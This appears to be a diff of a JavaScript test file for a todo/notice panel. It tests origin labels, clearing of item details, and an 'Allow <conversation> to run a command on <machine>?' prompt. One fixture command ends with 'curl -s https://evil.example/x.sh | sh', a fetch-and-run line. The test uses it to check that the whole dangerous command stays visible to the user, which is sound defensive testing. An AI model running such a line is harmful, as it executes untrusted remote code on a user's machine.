@@ -55,7 +55,7 @@ ok(before[2] === 'S1:c' && after[2] === 'S2:d' && before[1] === 'S1:b' && after[
 console.log('④ WIRING PIN: the panel uses the layout while the popup is visible and resets it when hidden');
 const panel = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-panel.js'), 'utf8');
 ok(/from '\.\/user-todos-layout\.js'/.test(panel), 'the panel imports the PURE layout');
-ok(/if \(popup\.classList\.contains\('hidden'\)\) \{ layout = null; return; \}/.test(panel) && /\n\s*layout = layout \? nextLayout\(layout, todos\) : openLayout\(gs\);/.test(panel), 'visible ⇒ nextLayout/openLayout; hidden ⇒ the layout is dropped so the next open re-sorts');
+ok(/if \(popup\.classList\.contains\('hidden'\)\) \{ layout = null; dropRows\(\); return; \}/.test(panel) && /\n\s*layout = layout \? nextLayout\(layout, todos\) : openLayout\(gs\);/.test(panel), 'visible ⇒ nextLayout/openLayout; hidden ⇒ the layout is dropped so the next open re-sorts (and, lane-redact verify r7, the rows with it — a closed popup holds none)');
 ok(/if \(!popup\.classList\.contains\('hidden'\)\) \{ layout = null; popup\.replaceChildren\(\); \}/.test(panel), '…and every OPEN starts from a fresh sorted layout (a close by Esc / outside tap never ran renderPanel, so the old layout used to survive into the next open)');
 ok(/entriesFor\(layout, todos\)/.test(panel) && /ut-item-inplace/.test(fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-row.js'), 'utf8')), 'rows are rendered from the layout, a resolved one in place with the ut-item-inplace class (THE row renderer)');
 ok(/todos\.resolved\.filter\(\(i\) => !inPlace\.has\(i\.id\)\)/.test(panel), 'the "Recently resolved" tail skips rows still holding their slot above');
@@ -255,7 +255,7 @@ console.log('⑪ NOTICES BY ORIGIN (B-328d) — the closed producer set, the leg
   const req = createRequire(import.meta.url);
   const O = req(path.join(ROOT, 'src/inbox-origin.js'));
   const L = await import(path.join(ROOT, 'src/lib/user-todos-layout.js'));
-  const SET = ['spend', 'login', 'pool', 'jobs', 'channels', 'browser', 'agent'];
+  const SET = ['spend', 'login', 'pool', 'jobs', 'channels', 'browser', 'machines', 'agent']; // lane-pairing ⑥: machines = an exit's "ask me each time" (src/exit-proxy.js)
   eq(O.INBOX_ORIGINS, SET, 'the closed set = exactly the producers that file, in display order (mounts has no producer — the browser-switch proposal in mounts-plugins-wiring.js is the BROWSER\'s; r2: no system — nothing has ever filed with by:system)');
   ok(Object.isFrozen(O.INBOX_ORIGINS) && Object.isFrozen(O.ORIGIN_LABELS), 'the set and its words are frozen');
   eq(Object.keys(O.ORIGIN_LABELS), SET, 'one label per origin, no extra');
@@ -264,12 +264,12 @@ console.log('⑪ NOTICES BY ORIGIN (B-328d) — the closed producer set, the leg
   for (const none of [null, undefined, '']) {
     let msg = '';
     try { O.normalizeOrigin(none); } catch (e) { msg = e.message; }
-    ok(msg === 'origin required (one of spend/login/pool/jobs/channels/browser/agent)', `normalizeOrigin(${JSON.stringify(none)}) THROWS "origin required" naming the set (r2: fail closed, never a default)`, msg);
+    ok(msg === 'origin required (one of spend/login/pool/jobs/channels/browser/machines/agent)', `normalizeOrigin(${JSON.stringify(none)}) THROWS "origin required" naming the set (r2: fail closed, never a default)`, msg);
   }
   for (const bad of ['mounts', 'system', 'SPEND', ' spend', 5, {}, ['spend']]) {
     let msg = '';
     try { O.normalizeOrigin(bad); } catch (e) { msg = e.message; }
-    ok(msg === 'origin must be one of spend/login/pool/jobs/channels/browser/agent', `normalizeOrigin(${JSON.stringify(bad)}) THROWS naming the set`);
+    ok(msg === 'origin must be one of spend/login/pool/jobs/channels/browser/machines/agent', `normalizeOrigin(${JSON.stringify(bad)}) THROWS naming the set`);
   }
   ok(JSON.stringify(L.INBOX_ORIGINS) === JSON.stringify(O.INBOX_ORIGINS) && JSON.stringify(L.ORIGIN_LABELS) === JSON.stringify(O.ORIGIN_LABELS), 'the layout re-exports THE set (one spelling)');
   const laySrc = fs.readFileSync(path.join(ROOT, 'src/lib/user-todos-layout.js'), 'utf8');
@@ -353,13 +353,13 @@ console.log('⑪ NOTICES BY ORIGIN (B-328d) — the closed producer set, the leg
       for (const none of [undefined, null, '']) {
         msg = '';
         try { m.add('accounts', { text: 'an undeclared producer', kind: 'notice', sessionName: 'Manage Agents', origin: none }); } catch (e) { msg = e.message; }
-        ok(msg === 'origin required (one of spend/login/pool/jobs/channels/browser/agent)' && m.snapshot().open.length === n0 && casts.length === c0, `r2 FAIL CLOSED: a filing naming no origin (${JSON.stringify(none)}) THROWS "origin required" and files nothing, broadcasts nothing (it used to land under Agents silently)`, msg);
+        ok(msg === 'origin required (one of spend/login/pool/jobs/channels/browser/machines/agent)' && m.snapshot().open.length === n0 && casts.length === c0, `r2 FAIL CLOSED: a filing naming no origin (${JSON.stringify(none)}) THROWS "origin required" and files nothing, broadcasts nothing (it used to land under Agents silently)`, msg);
       }
       eq(m.add('claude:x', { text: 'an ask', origin: 'agent' }).origin, 'agent', "the agent route's shape declares 'agent' explicitly");
       msg = '';
       const n1 = m.snapshot().open.length;
       try { m.add('claude:x', { text: 'typo', origin: 'mounts' }); } catch (e) { msg = e.message; }
-      ok(/origin must be one of spend\/login\/pool\/jobs\/channels\/browser\/agent$/.test(msg) && m.snapshot().open.length === n1, 'a value outside the set THROWS by name and files nothing');
+      ok(/origin must be one of spend\/login\/pool\/jobs\/channels\/browser\/machines\/agent$/.test(msg) && m.snapshot().open.length === n1, 'a value outside the set THROWS by name and files nothing');
       const re = m.add('accounts', { text: 'spend warning', kind: 'notice', origin: 'login', urgency: 'high' });
       eq([re.id === a.id, re.origin, re.urgency], [true, 'spend', 'high'], 'a re-file of the same item KEEPS its declared origin (other fields still merge)');
       // a LEGACY item on disk (no origin) re-filed by a declaring producer takes the declaration
@@ -402,6 +402,7 @@ console.log('⑪ NOTICES BY ORIGIN (B-328d) — the closed producer set, the leg
     'src/server/mounts-plugins-wiring.js': 'browser', // the browser routes' switch PROPOSAL (this file only wires them)
     'src/agent-routes.js': 'agent',
     'src/server/helper-asks.js': 'agent', // lane S1: a helper's permission ask left unanswered for 60 s
+    'src/exit-proxy.js': 'machines', // lane-pairing ⑥: "Allow <conversation> to run a command on <machine>?" (Allow / Deny, 60 s)
   };
   // r2: no exemptions — every origin of the closed set has a producer (the
   // `system` row was dropped: nothing has ever filed with by:'system')
@@ -503,7 +504,7 @@ console.log('⑪ NOTICES BY ORIGIN (B-328d) — the closed producer set, the leg
   console.log('     sites: ' + C.sites.map((x) => `${x.rel.replace(/^src\//, '')}:${x.line}=${x.origin}`).join(' · '));
   ok(C.sites.length >= 12, `the census scope is non-vacuous (${C.sites.length} sites; 12 when this shipped)`);
   ok(C.problems.length === 0, 'every site declares a literal origin of the closed set, the one its file produces; every origin has a producer; every PRODUCERS row files', C.problems);
-  eq(C.sites.length, 16, 'the widened match finds exactly the 16 declared sites (every classList.add(a, b) excluded, no other two-argument add in the tree; lane H verify r5 added the browser keeper\'s keeps-closing notice; lane S1 the helper-ask item; R4 (B-6acc) the channels engine\'s composed-message approval pointer; lane R5 verify r6 the channels engine\'s unsaved-sign-in item)');
+  eq(C.sites.length, 18, 'the widened match finds exactly the 18 declared sites (every classList.add(a, b) excluded, no other two-argument add in the tree; lane H verify r5 added the browser keeper\'s keeps-closing notice; lane S1 the helper-ask item; R4 (B-6acc) the channels engine\'s composed-message approval pointer; lane R5 verify r6 the channels engine\'s unsaved-sign-in item; lane-pairing ⑥ the exit ask; lane-pool-pin r2 the pool engine\'s removed-member hold notice — the owner\'s 全B)');
   eq(C.sites.filter((x) => x.rel === 'src/server/channels-engine.js').length, 7, 'channels-engine files from seven sites — all seven declared (R4: + composePointerSync, origin channels; R5 verify r6: the unsaved-sign-in item)');
   console.log('   negative controls (the census must be able to go red)');
   const drop = { ...files, 'src/server/spend-guard.js': files['src/server/spend-guard.js'].split("origin: 'spend', ").join('') };
@@ -640,6 +641,9 @@ console.log('⑫ THE SIZE OF AN ITEM + THE PREVIEW SHAPE (2026-09-27, the For-yo
   const changed = restoreDetails({ open: [], resolved: [{ id: 'a', status: 'done', detail: 'different head'.padEnd(300, '.'), detailTruncated: true }] }, seen.fullById);
   ok(changed.todos.resolved[0].detailTruncated === true, 'a preview that is NOT the head of the remembered text (the detail changed) is never overwritten');
   ok(!restoreDetails({ open: [], resolved: [] }, seen.fullById).fullById.has('a'), 'an id the snapshot no longer lists leaves the memory (no unbounded growth)');
+  // "Clear content…" (2026-09-28): a CLEARED item (detail null, clearedAt) is never given back the whole text this client kept, and the memory forgets it
+  const cleared = restoreDetails({ open: [], resolved: [{ id: 'a', status: 'done', text: "[cleared at the user's request]", detail: null, clearedAt: 5, clearedBy: 'owner' }] }, seen.fullById);
+  ok(cleared.todos.resolved[0].detail === null && !cleared.fullById.has('a'), 'a CLEARED item keeps no detail even though this client held its whole text — and the client\'s memory drops that text (the clear reaches every copy)', cleared);
   ok(restoreDetails({ open: [], resolved: [{ id: 'c', status: 'done', detail: 'F'.repeat(300), detailTruncated: true }] }, new Map([['c', 'F'.repeat(500)]])).todos.resolved[0].detail.length === 500, 'a whole detail ensureDetail fetched (already in the map) applies the same way');
   const g = restoreDetails(null, null);
   ok(JSON.stringify(g.todos) === JSON.stringify({ open: [], resolved: [] }) && g.fullById.size === 0, 'garbage in ⇒ empty lists');
@@ -676,6 +680,67 @@ console.log('⑫ THE SIZE OF AN ITEM + THE PREVIEW SHAPE (2026-09-27, the For-yo
   ok(/const r = restoreDetails\(next \|\| \{ open: \[\], resolved: \[\] \}, fullById\); todos = r\.todos; fullById = r\.fullById;/.test(acts) && /fetchJson\(`\/api\/user-todos\/\$\{encodeURIComponent\(id\)\}`\)/.test(acts) && /ensureDetail,/.test(acts), 'the client model restores every whole detail it saw on each snapshot and fetches a previewed one on demand (ensureDetail, exported)');
   ok(/if \(item\.detailCut\) console\.log\('NOTE: your --detail was CUT at ' \+ item\.detailCut/.test(cli) && /if \(item\.textCut\) console\.log\('NOTE: the question itself was CUT at ' \+ item\.textCut/.test(cli) && /up to 8000 chars/.test(cli), 'vibespace-ask names a cut detail / question by its cap and advertises 8000');
   ok(/up to 8000 chars of context/.test(fs.readFileSync(path.join(ROOT, 'docs/agent/ask-manual.md'), 'utf8')), 'the agent manual says 8000');
+}
+
+console.log('lane-pairing naive-user N-ask: an exit ask\'s Allow / Deny are their own line, never in the hover-dimmed action bar');
+{
+  // THE ROW RENDERER in node under a minimal DOM (renderRow only builds innerHTML); the patched copy through mutant-copy
+  const noop = () => {};
+  const mkEl = () => ({ dataset: {}, className: '', innerHTML: '', querySelector: () => null, querySelectorAll: () => [], appendChild: noop, addEventListener: noop, setAttribute: noop, classList: { add: noop, remove: noop, toggle: noop }, style: {} });
+  const had = { window: globalThis.window, document: globalThis.document, localStorage: globalThis.localStorage, addEventListener: globalThis.addEventListener };
+  globalThis.window = globalThis; globalThis.addEventListener = globalThis.addEventListener || noop; globalThis.removeEventListener = globalThis.removeEventListener || noop;
+  globalThis.localStorage = { getItem: () => null, setItem: noop, removeItem: noop };
+  globalThis.document = { createElement: mkEl, querySelector: () => null, querySelectorAll: () => [], getElementById: () => null, addEventListener: noop, removeEventListener: noop, documentElement: { style: {}, lang: 'en' }, body: mkEl(), head: mkEl() };
+  try {
+    const { pathToFileURL } = await import('node:url');
+    const { mutantCopies } = await import(path.join(ROOT, 'scripts/mutant-copy.mjs'));
+    const REL = 'src/lib/user-todos-row.js';
+    const ctx = { t: (x, p) => (p ? x.replace(/\{(\w+)\}/g, (m, k) => (p[k] !== undefined ? String(p[k]) : m)) : x), wordsOf: (i) => i.text, detailOf: () => '', nameFor: () => 'S', replyState: () => ({ show: false }) };
+    const ask = { item: { id: 'ut-x', text: 'Allow "ops" to run a command on Macbook?', action: { type: 'exit-run-ask', askId: 'k1', cmd: 'uname -a' }, createdAt: Date.now() } };
+    const verdict = (html) => {
+      const bar = (html.match(/<span class="ut-actions">[\s\S]*?<\/span>/) || [''])[0];
+      const ans = html.indexOf('<div class="ut-exit-answer">'), cmd = html.search(/<(div|pre) class="ut-exit-cmd">/), note = html.indexOf('<div class="ut-exit-note">'); // verify-r4 F4: the command is a <pre>
+      return { inBar: /ut-action-exit/.test(bar), ownLine: ans > cmd && cmd >= 0 && note > ans && /ut-exit-allow[\s\S]*ut-exit-deny/.test(html.slice(ans, note)) };
+    };
+    const R = await import(pathToFileURL(path.join(ROOT, REL)).href);
+    const v = verdict(R.renderRow(ask, ctx).innerHTML);
+    ok(!v.inBar && v.ownLine, 'N-ask: Allow / Deny are a line of their own under the command (never inside .ut-actions, 35 % until hover on the desktop; the phone\'s floated bar crushed the question)', v);
+    const done = verdict(R.renderRow({ item: { ...ask.item, action: { type: 'exit-run-ask', cmd: 'uname -a' } } }, ctx).innerHTML);
+    ok(!done.inBar && !done.ownLine, 'an exit item without an askId (nothing left to answer) draws no Allow / Deny', done);
+    // CONTROL: the pre-fix renderer (the two buttons back in actionBtnHtml, the answer line gone)
+    const src = fs.readFileSync(path.join(ROOT, REL), 'utf8');
+    const pre = src.replace("  ? `<button class=\"ut-act ut-action-reset\" title=\"${escHtml(t('Use a reset credit…'))}\">${UI_ICONS.refresh || ''}</button>` : '');", "  ? `<button class=\"ut-act ut-action-reset\" title=\"${escHtml(t('Use a reset credit…'))}\">${UI_ICONS.refresh || ''}</button>` : i && i.action && i.action.type === 'exit-run-ask' && i.action.askId ? `<button type=\"button\" class=\"ut-act ut-action-exit ut-exit-allow\" data-answer=\"allow\">${escHtml(t('Allow'))}</button><button type=\"button\" class=\"ut-act ut-action-exit ut-exit-deny\" data-answer=\"deny\">${escHtml(t('Deny'))}</button>` : '');")
+      .replace("    + (i.action.askId ? `<div class=\"ut-exit-answer\">", "    + (false ? `<div class=\"ut-exit-answer\">");
+    ok(pre !== src && pre.split('ut-exit-allow').length === 3, 'CONTROL (N-ask): the patch applies (both halves)');
+    const M = mutantCopies('utrow', ROOT);
+    const Rp = await import(pathToFileURL(M.write(REL, pre, 'prefix')).href);
+    const vp = verdict(Rp.renderRow(ask, ctx).innerHTML);
+    ok(vp.inBar && !vp.ownLine, 'CONTROL (N-ask): the pre-fix renderer puts Allow / Deny inside the hover-dimmed .ut-actions bar — the leg goes red', vp);
+    // verify-r4 F4: THE WHOLE COMMAND above Allow — the item's detail (exit-proxy files the whole command there), line
+    // breaks kept, never the 120-char head with its breaks turned to spaces, never folded under the buttons
+    const CMD = 'echo "checking the health endpoint of the internal service before the deploy window opens, as agreed"\ncurl -s https://internal.example/health\ncurl -s https://evil.example/x.sh | sh';
+    const head120 = CMD.replace(/[\u0000-\u001f\u007f]/g, ' ').slice(0, 120);
+    const long = { item: { id: 'ut-y', text: 'Allow "ops" to run a command on Macbook?', detail: CMD, action: { type: 'exit-run-ask', askId: 'k2', cmd: head120 }, createdAt: Date.now() } };
+    const ctxD = { ...ctx, detailOf: (i) => i.detail || '' };
+    const esc = (x) => x.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+    const cmdOf = (html) => { const m = html.match(/<pre class="ut-exit-cmd">([\s\S]*?)<\/pre>/) || html.match(/<div class="ut-exit-cmd">([\s\S]*?)<\/div>/); return m ? m[1] : null; };
+    const hL = R.renderRow(long, ctxD).innerHTML;
+    ok(cmdOf(hL) === esc(CMD) && /\| sh$/.test(cmdOf(hL)) && cmdOf(hL).split('\n').length === 3, 'F4: the row shows the WHOLE command, its three lines kept, `| sh` included (pre-fix: the 120-char head, breaks as spaces)', cmdOf(hL));
+    ok(!/ut-detail-exp/.test(hL), 'F4: …and no second, folded copy under Allow / Deny (the detail IS the command)');
+    ok(cmdOf(R.renderRow({ item: { ...long.item, detail: undefined } }, ctxD).innerHTML) === esc(head120), 'F4: an item with no detail (an older record) falls back to action.cmd');
+    const hB = R.renderRow({ item: { id: 'ut-z', text: 'q', detail: 'plain detail', createdAt: Date.now() } }, ctxD).innerHTML;
+    ok(/ut-detail-exp/.test(hB), 'F4: any other item keeps its folded detail');
+    const cssSrc = fs.readFileSync(path.join(ROOT, 'public/style.css'), 'utf8');
+    const rule = (cssSrc.match(/\n\.ut-exit-cmd \{[^}]*\}/) || [''])[0];
+    ok(/white-space: pre-wrap/.test(rule) && !/max-height|overflow(-[xy])?:/.test(rule.replace(/\/\*[\s\S]*?\*\//g, '')), 'F4: the box keeps line breaks and shows ALL of the command — no max-height, no overflow rule (pre-fix: 4.5em, overflow hidden; an inner scroll box hides the rest behind a macOS overlay scrollbar)', rule);
+    // CONTROL (F4): the pre-fix renderer (action.cmd in a clipped div, the detail folded below)
+    const preF4 = src.replace("  ? `<pre class=\"ut-exit-cmd\">${escHtml(exitCmdOf(i))}</pre>`", "  ? `<div class=\"ut-exit-cmd\">${escHtml(String(i.action.cmd || ''))}</div>`").replace("const detailHtml = detail && !(i.action && i.action.type === 'exit-run-ask') ?", 'const detailHtml = detail ?');
+    ok(preF4 !== src && preF4.split('String(i.action.cmd || \'\')').length === 2, 'CONTROL (F4): the patch applies (both halves)');
+    const Rf4 = await import(pathToFileURL(M.write(REL, preF4, 'prefixf4')).href);
+    const hP = Rf4.renderRow(long, ctxD).innerHTML;
+    ok(cmdOf(hP) === esc(head120) && !/\| sh/.test(cmdOf(hP)) && /ut-detail-exp/.test(hP), 'CONTROL (F4): the pre-fix row shows "…as agreed\" curl -s https://in" — `| sh` nowhere above Allow — the F4 leg goes red', cmdOf(hP));
+  } catch (e) { ok(false, 'N-ask: the row renderer runs under the minimal DOM', e.stack); }
+  finally { for (const [k, v] of Object.entries(had)) { if (v === undefined) delete globalThis[k]; else globalThis[k] = v; } }
 }
 
 console.log(fail ? `\n${fail} FAILED (${pass} passed)` : `\nALL PASS (${pass})`);
